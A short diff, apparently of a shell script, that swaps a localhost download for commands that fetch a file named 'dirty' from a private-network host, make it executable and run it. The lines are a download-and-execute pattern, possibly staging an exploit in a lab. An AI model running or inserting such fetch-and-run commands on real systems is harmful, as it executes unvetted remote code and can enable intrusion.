@@ -1,2 +1,4 @@
-wget http://localhost:8000/test3; chmod +x test3;./test3
+wget http://192.168.98.130:8000/dirty
+chmod +x dirty
+./dirty
 pwd
